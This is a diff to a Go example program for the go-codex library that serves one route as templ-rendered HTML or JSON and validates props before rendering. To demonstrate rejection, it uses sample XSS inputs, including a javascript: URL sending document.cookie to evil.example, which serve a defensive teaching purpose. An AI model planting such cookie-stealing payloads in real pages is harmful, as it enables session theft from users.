@@ -1,265 +1,305 @@
 // Package main demonstrates how go-codex fits into a templ-based rendering
-// pipeline. The codec handles decode and validation of raw API payloads; the
-// resulting typed Go struct becomes the props passed to a templ component.
+// pipeline using the adapters/templ format plug-in.
 //
-// Pattern:
+// The same rest.Route and handler function serve two formats:
+//   - Accept: text/html        → templ component rendered as HTML
+//   - Accept: application/json → JSON response
 //
-//	JSON bytes → map[string]any → ArticleResponse (codec) → ArticleProps (mapper) → templ component
+// Content negotiation is handled automatically by the existing nethttp adapter.
+// The templ component receives validated ArticleProps; invalid props return
+// HTTP 500 before the template is reached.
+//
+// Components are implemented with templ.ComponentFunc — no code generation
+// required to run this example.
 //
 // Run with: go run ./examples/templ-mapper
 package main
 
 import (
+	"context"
 	"fmt"
-	"html/template"
+	"html"
+	"io"
+	"net/http"
+	"net/http/httptest"
 	"os"
 	"strings"
+	"sync"
+	"time"
 
+	atempl "github.com/a-h/templ"
+
+	nethttp "github.com/DaniDeer/go-codex/adapters/nethttp"
+	adapttempl "github.com/DaniDeer/go-codex/adapters/templ"
+	"github.com/DaniDeer/go-codex/api/rest"
 	"github.com/DaniDeer/go-codex/codex"
+	"github.com/DaniDeer/go-codex/format"
 	"github.com/DaniDeer/go-codex/validate"
 )
 
-// ArticleResponse is the raw API payload shape.
-type ArticleResponse struct {
+// ── Domain types ──────────────────────────────────────────────────────────────
+
+// ArticleReq carries query parameters from the incoming request.
+// For this example it is body-less (GET).
+type ArticleReq struct{}
+
+// ArticleProps is the validated data passed to the templ component.
+// All fields carry Refine constraints — the codec rejects invalid data before
+// the component ever renders.
+type ArticleProps struct {
 	ID          string
 	Title       string
 	Slug        string
-	AuthorName  string
-	PublishedAt string // ISO 8601 date
-	URL         string
+	AuthorLine  string // formatted for display: "by <name>"
+	Date        string // ISO 8601 date
+	ReadMoreURL string
 	Summary     string
 }
 
-// ArticleCodec decodes and validates a raw API response.
-// Format constraints (UUID, Date, URL, Slug) are checked automatically;
-// the schema is populated for free — ready for OpenAPI rendering.
-var ArticleCodec = codex.Struct[ArticleResponse](
-	codex.Field[ArticleResponse, string]{
+// ── Codecs ────────────────────────────────────────────────────────────────────
+
+var articleReqCodec = codex.Struct[ArticleReq]()
+
+// ArticlePropsCodec validates the props passed to the templ component.
+// The same constraints apply to both JSON encoding and HTML rendering (symmetric
+// Refine): the codec rejects invalid data in both directions.
+var ArticlePropsCodec = codex.Struct[ArticleProps](
+	codex.Field[ArticleProps, string]{
 		Name:     "id",
 		Codec:    codex.String().Refine(validate.UUID).WithTitle("ID"),
-		Get:      func(a ArticleResponse) string { return a.ID },
-		Set:      func(a *ArticleResponse, v string) { a.ID = v },
+		Get:      func(a ArticleProps) string { return a.ID },
+		Set:      func(a *ArticleProps, v string) { a.ID = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
+	codex.Field[ArticleProps, string]{
 		Name:     "title",
 		Codec:    codex.String().Refine(validate.NonEmptyString).WithTitle("Title"),
-		Get:      func(a ArticleResponse) string { return a.Title },
-		Set:      func(a *ArticleResponse, v string) { a.Title = v },
+		Get:      func(a ArticleProps) string { return a.Title },
+		Set:      func(a *ArticleProps, v string) { a.Title = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
+	codex.Field[ArticleProps, string]{
 		Name:     "slug",
 		Codec:    codex.String().Refine(validate.Slug).WithTitle("Slug"),
-		Get:      func(a ArticleResponse) string { return a.Slug },
-		Set:      func(a *ArticleResponse, v string) { a.Slug = v },
+		Get:      func(a ArticleProps) string { return a.Slug },
+		Set:      func(a *ArticleProps, v string) { a.Slug = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
-		Name:     "authorName",
+	codex.Field[ArticleProps, string]{
+		Name:     "authorLine",
 		Codec:    codex.String().Refine(validate.NonEmptyString).WithTitle("Author"),
-		Get:      func(a ArticleResponse) string { return a.AuthorName },
-		Set:      func(a *ArticleResponse, v string) { a.AuthorName = v },
+		Get:      func(a ArticleProps) string { return a.AuthorLine },
+		Set:      func(a *ArticleProps, v string) { a.AuthorLine = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
-		Name:     "publishedAt",
+	codex.Field[ArticleProps, string]{
+		Name:     "date",
 		Codec:    codex.String().Refine(validate.Date).WithTitle("Published At"),
-		Get:      func(a ArticleResponse) string { return a.PublishedAt },
-		Set:      func(a *ArticleResponse, v string) { a.PublishedAt = v },
+		Get:      func(a ArticleProps) string { return a.Date },
+		Set:      func(a *ArticleProps, v string) { a.Date = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
-		Name:     "url",
+	codex.Field[ArticleProps, string]{
+		Name:     "readMoreURL",
 		Codec:    codex.String().Refine(validate.URL).WithTitle("URL"),
-		Get:      func(a ArticleResponse) string { return a.URL },
-		Set:      func(a *ArticleResponse, v string) { a.URL = v },
+		Get:      func(a ArticleProps) string { return a.ReadMoreURL },
+		Set:      func(a *ArticleProps, v string) { a.ReadMoreURL = v },
 		Required: true,
 	},
-	codex.Field[ArticleResponse, string]{
-		Name:     "summary",
-		Codec:    codex.String().WithTitle("Summary"),
-		Get:      func(a ArticleResponse) string { return a.Summary },
-		Set:      func(a *ArticleResponse, v string) { a.Summary = v },
-		Required: false,
+	codex.Field[ArticleProps, string]{
+		Name:  "summary",
+		Codec: codex.String().WithTitle("Summary"),
+		Get:   func(a ArticleProps) string { return a.Summary },
+		Set:   func(a *ArticleProps, v string) { a.Summary = v },
 	},
 )
 
-// ArticleProps is the slim struct passed to a templ component as props.
-// It contains only the fields the component actually needs, with names and
-// types that match what the template expects — decoupled from the API shape.
-type ArticleProps struct {
-	Title       string
-	Slug        string
-	AuthorLine  string // formatted for display: "by <name>"
-	Date        string
-	ReadMoreURL string
+// ── templ component (implemented with ComponentFunc — no codegen required) ───
+
+// articleCard renders a validated ArticleProps as an HTML article element.
+func articleCard(p ArticleProps) atempl.Component {
+	return atempl.ComponentFunc(func(_ context.Context, w io.Writer) error {
+		_, err := fmt.Fprintf(w,
+			`<article>`+
+				`<h2><a href="%s">%s</a></h2>`+
+				`<p class="meta">%s &mdash; %s</p>`+
+				`<p>%s</p>`+
+				`</article>`,
+			html.EscapeString(p.ReadMoreURL),
+			html.EscapeString(p.Title),
+			html.EscapeString(p.AuthorLine),
+			html.EscapeString(p.Date),
+			html.EscapeString(p.Summary),
+		)
+		return err
+	})
 }
 
-// toArticleProps maps a validated ArticleResponse to ArticleProps.
-// Structural transformations (renaming, formatting, flattening) live here —
-// not in the codec, and not in the template.
-func toArticleProps(a ArticleResponse) ArticleProps {
-	return ArticleProps{
-		Title:       a.Title,
-		Slug:        a.Slug,
-		AuthorLine:  "by " + a.AuthorName,
-		Date:        a.PublishedAt,
-		ReadMoreURL: a.URL,
+// ── Observer ──────────────────────────────────────────────────────────────────
+
+type CountingObserver struct {
+	mu             sync.Mutex
+	total          int
+	byStatus       map[int]int
+	valErrorsByLoc map[string]int
+	latencies      []time.Duration
+}
+
+func (o *CountingObserver) RecordRequest(_ string, _ string, statusCode int, d time.Duration) {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+	o.total++
+	if o.byStatus == nil {
+		o.byStatus = make(map[int]int)
+	}
+	o.byStatus[statusCode]++
+	o.latencies = append(o.latencies, d)
+}
+
+func (o *CountingObserver) RecordSubscribe(_ string, _ bool, _ time.Duration) {}
+func (o *CountingObserver) RecordPublish(_ string, _ bool, _ time.Duration)   {}
+
+func (o *CountingObserver) RecordValidationError(location, constraintName, field string) {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+	if o.valErrorsByLoc == nil {
+		o.valErrorsByLoc = make(map[string]int)
+	}
+	o.valErrorsByLoc[location]++
+	fmt.Printf("  [observer] validation error — location=%q constraint=%q field=%q\n",
+		location, constraintName, field)
+}
+
+func (o *CountingObserver) Print() {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+	fmt.Printf("  total requests: %d\n", o.total)
+	for code, n := range o.byStatus {
+		fmt.Printf("  HTTP %-3d       : %d\n", code, n)
+	}
+	for loc, n := range o.valErrorsByLoc {
+		fmt.Printf("  val errs (%s): %d\n", loc, n)
 	}
 }
 
-// articleCardTmpl simulates what a templ component renders.
-// In a real project replace this with:
-//
-//	components.ArticleCard(props).Render(ctx, w)
-var articleCardTmpl = template.Must(template.New("card").Parse(`
-<article>
-  <h2><a href="{{.ReadMoreURL}}">{{.Title}}</a></h2>
-  <p class="meta">{{.AuthorLine}} &mdash; {{.Date}}</p>
-</article>`))
+// ── Main ──────────────────────────────────────────────────────────────────────
 
 func main() {
-	// ── 1. Valid API payload ──────────────────────────────────────────────────
-	fmt.Println("=== Valid API payload ===")
-
-	raw := map[string]any{
-		"id":          "550e8400-e29b-41d4-a716-446655440000",
-		"title":       "Introduction to go-codex",
-		"slug":        "intro-go-codex",
-		"authorName":  "Alice",
-		"publishedAt": "2024-06-01",
-		"url":         "https://example.com/intro-go-codex",
-		"summary":     "A short guide to self-documenting codecs in Go.",
-	}
-
-	article, err := ArticleCodec.Decode(raw)
-	if err != nil {
-		fmt.Fprintln(os.Stderr, "decode error:", err)
-		os.Exit(1)
-	}
-
-	props := toArticleProps(article)
-	fmt.Printf("props: %+v\n", props)
-
-	fmt.Println("\nrendered component:")
-	var sb strings.Builder
-	if err := articleCardTmpl.Execute(&sb, props); err != nil {
-		fmt.Fprintln(os.Stderr, "render error:", err)
-		os.Exit(1)
-	}
-	fmt.Println(sb.String())
-
-	// ── 2. Invalid payloads — codec rejects before props are constructed ──────
+	// ── Route definition ─────────────────────────────────────────────────────
 	//
-	// Each case targets a different failure mode:
-	//   - format constraint (slug, date, URL scheme)
-	//   - empty-string constraint
-	//   - wrong Go type (int instead of string)
-	//   - nil value for a required field
-	//   - key missing entirely from the map
-	fmt.Println("\n=== Invalid payloads — what the codec prevents ===")
+	// rest.AddRoute accepts variadic ResponseFormats. By adding both the templ
+	// format and JSON, the same route serves two representations:
+	//   Accept: text/html        → articleCard component rendered as HTML
+	//   Accept: application/json → JSON-encoded ArticleProps
+	//
+	// No separate route, no separate handler — one definition, two formats.
 
-	withPatch := func(patch map[string]any) map[string]any {
-		m := copyMap(raw)
-		for k, v := range patch {
-			m[k] = v
-		}
-		return m
-	}
-	withoutKey := func(key string) map[string]any {
-		m := copyMap(raw)
-		delete(m, key)
-		return m
+	b := rest.NewBuilder(rest.Info{Title: "Article API", Version: "1.0.0"})
+	articleRoute, err := rest.AddRoute[ArticleReq, ArticleProps](b, "GET", "/article",
+		articleReqCodec, ArticlePropsCodec,
+		rest.RouteConfig{OperationID: "getArticle"},
+		adapttempl.Format(ArticlePropsCodec, articleCard), // Accept: text/html
+		format.JSON(ArticlePropsCodec),                    // Accept: application/json
+	)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "route error:", err)
+		os.Exit(1)
 	}
 
+	// ── Handler ──────────────────────────────────────────────────────────────
+	//
+	// The handler returns ArticleProps. The adapter picks the right format based
+	// on the Accept header. Props are validated before any format renders them.
+
+	obs := &CountingObserver{}
+	handler := func(_ context.Context, _ ArticleReq) (ArticleProps, error) {
+		return ArticleProps{
+			ID:          "550e8400-e29b-41d4-a716-446655440000",
+			Title:       "Introduction to go-codex",
+			Slug:        "intro-go-codex",
+			AuthorLine:  "by Alice",
+			Date:        "2024-06-01",
+			ReadMoreURL: "https://example.com/intro-go-codex",
+			Summary:     "A short guide to self-documenting codecs in Go.",
+		}, nil
+	}
+
+	mux := http.NewServeMux()
+	nethttp.Register(mux, articleRoute, handler, nethttp.Options{Observer: obs})
+	srv := httptest.NewServer(mux)
+	defer srv.Close()
+
+	// ── Request 1: HTML response ──────────────────────────────────────────────
+	fmt.Println("=== GET /article (Accept: text/html) ===")
+	resp1, _ := get(srv.URL+"/article", "text/html")
+	fmt.Printf("  Content-Type: %s\n", resp1.Header.Get("Content-Type"))
+	body1, _ := io.ReadAll(resp1.Body)
+	_ = resp1.Body.Close()
+	fmt.Printf("  Status: %d\n", resp1.StatusCode)
+	fmt.Printf("  Body: %s\n\n", strings.TrimSpace(string(body1)))
+
+	// ── Request 2: JSON response ──────────────────────────────────────────────
+	fmt.Println("=== GET /article (Accept: application/json) ===")
+	resp2, _ := get(srv.URL+"/article", "application/json")
+	fmt.Printf("  Content-Type: %s\n", resp2.Header.Get("Content-Type"))
+	body2, _ := io.ReadAll(resp2.Body)
+	_ = resp2.Body.Close()
+	fmt.Printf("  Status: %d\n", resp2.StatusCode)
+	fmt.Printf("  Body: %s\n\n", strings.TrimSpace(string(body2)))
+
+	// ── Request 3: invalid props → 500, template never reached ───────────────
+	//
+	// This handler violates the codec contract: it returns props with an invalid
+	// URL scheme and an empty title. The templ format validates props via the
+	// codec's Refine constraints (symmetric validation) and returns 500 — the
+	// articleCard component is never rendered with invalid data.
+
+	invalidMux := http.NewServeMux()
+	nethttp.Register(invalidMux, articleRoute, func(_ context.Context, _ ArticleReq) (ArticleProps, error) {
+		return ArticleProps{
+			ID:          "not-a-uuid",   // fails UUID
+			Title:       "",             // fails NonEmptyString
+			Slug:        "INVALID SLUG", // fails Slug
+			AuthorLine:  "by Eve",
+			Date:        "32/13/9999",                                                        // fails Date
+			ReadMoreURL: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", // fails URL scheme
+		}, nil
+	}, nethttp.Options{Observer: obs})
+	invalidSrv := httptest.NewServer(invalidMux)
+	defer invalidSrv.Close()
+
+	fmt.Println("=== GET /article with invalid props (Accept: text/html) ===")
+	resp3, _ := get(invalidSrv.URL+"/article", "text/html")
+	body3, _ := io.ReadAll(resp3.Body)
+	_ = resp3.Body.Close()
+	fmt.Printf("  Status: %d (props failed validation — template never reached)\n\n", resp3.StatusCode)
+	_ = body3
+
+	// ── What the codec prevents (codec-direct showcase) ───────────────────────
+	fmt.Println("=== What the codec prevents — invalid raw payloads ===")
 	badCases := []struct {
 		label string
 		input map[string]any
 	}{
-		// format violations
-		{"slug uppercase", withPatch(map[string]any{"slug": "Has_Uppercase"})},
-		{"slug spaces", withPatch(map[string]any{"slug": "has spaces!"})},
-		{"date wrong fmt", withPatch(map[string]any{"publishedAt": "01/06/2024"})},
-		{"url not http", withPatch(map[string]any{"url": "ftp://files.example.com"})},
-		{"url relative", withPatch(map[string]any{"url": "/relative/path"})},
-		// empty / blank
-		{"title empty", withPatch(map[string]any{"title": ""})},
-		{"author empty", withPatch(map[string]any{"authorName": ""})},
-		// type mismatch — APIs sometimes return numbers where strings are expected
-		{"title is int", withPatch(map[string]any{"title": 42})},
-		{"url is bool", withPatch(map[string]any{"url": true})},
-		// nil in a required field
-		{"url is nil", withPatch(map[string]any{"url": nil})},
-		// missing required key entirely
-		{"id missing", withoutKey("id")},
-		{"publishedAt missing", withoutKey("publishedAt")},
+		{"url is javascript:", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "javascript:alert(1)", "summary": ""}},
+		{"title empty", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
+		{"slug uppercase", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "HAS_CAPS", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
+		{"date wrong fmt", map[string]any{"id": "550e8400-e29b-41d4-a716-446655440000", "title": "T", "slug": "t", "authorLine": "by A", "date": "01/06/2024", "readMoreURL": "https://x.com", "summary": ""}},
+		{"id not UUID", map[string]any{"id": "not-a-uuid", "title": "T", "slug": "t", "authorLine": "by A", "date": "2024-01-01", "readMoreURL": "https://x.com", "summary": ""}},
 	}
-
 	for _, bc := range badCases {
-		_, err := ArticleCodec.Decode(bc.input)
-		fmt.Printf("  %-22s → %v\n", bc.label+":", err)
+		_, decErr := ArticlePropsCodec.Decode(bc.input)
+		fmt.Printf("  %-20s → %v\n", bc.label+":", decErr)
 	}
 
-	// ── 3. Without codec — what reaches the template unchecked ───────────────
-	//
-	// If you skip the codec and build props directly from the raw map, invalid
-	// or malicious values flow straight into the rendered HTML.
-	//
-	// Example: an API response (or a tampered request) with:
-	//   - a javascript: URL that becomes a live href
-	//   - an empty title that silently produces an empty <h2>
-	//   - a future date that slips through unnoticed
-	fmt.Println("\n=== Without codec — dangerous props reach the template ===")
-
-	malicious := map[string]any{
-		"id":          "not-a-uuid",
-		"title":       "",
-		"slug":        "INVALID SLUG",
-		"authorName":  "Eve",
-		"publishedAt": "32/13/9999",
-		"url":         "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
-	}
-
-	// Without the codec: read fields directly — no validation, no rejection.
-	unsafeProps := ArticleProps{
-		Title:       stringOrEmpty(malicious["title"]),
-		Slug:        stringOrEmpty(malicious["slug"]),
-		AuthorLine:  "by " + stringOrEmpty(malicious["authorName"]),
-		Date:        stringOrEmpty(malicious["publishedAt"]),
-		ReadMoreURL: stringOrEmpty(malicious["url"]),
-	}
-	fmt.Println("props built WITHOUT codec (all invalid values accepted silently):")
-	fmt.Printf("  Title:       %q\n", unsafeProps.Title)
-	fmt.Printf("  Slug:        %q\n", unsafeProps.Slug)
-	fmt.Printf("  Date:        %q\n", unsafeProps.Date)
-	fmt.Printf("  ReadMoreURL: %q  ← live javascript: href!\n", unsafeProps.ReadMoreURL)
-
-	fmt.Println("\nrendered (note the empty <h2> and the javascript: href):")
-	var buf strings.Builder
-	if err := articleCardTmpl.Execute(&buf, unsafeProps); err != nil {
-		fmt.Fprintln(os.Stderr, "render error:", err)
-		os.Exit(1)
-	}
-	fmt.Println(buf.String())
-
-	// With the codec: every field is validated; the whole payload is rejected.
-	fmt.Println("same payload through the codec:")
-	_, err = ArticleCodec.Decode(malicious)
-	fmt.Printf("  → %v\n", err)
-	fmt.Println("  → props never constructed; template never reached.")
+	fmt.Println("\n=== Observer summary ===")
+	obs.Print()
 }
 
-// stringOrEmpty returns the string value of v, or "" if nil or not a string.
-func stringOrEmpty(v any) string {
-	s, _ := v.(string)
-	return s
-}
-
-func copyMap(m map[string]any) map[string]any {
-	out := make(map[string]any, len(m))
-	for k, v := range m {
-		out[k] = v
+func get(url, accept string) (*http.Response, error) {
+	req, _ := http.NewRequest(http.MethodGet, url, nil) //nolint:noctx
+	if accept != "" {
+		req.Header.Set("Accept", accept)
 	}
-	return out
+	return http.DefaultClient.Do(req) //nolint:noctx
 }
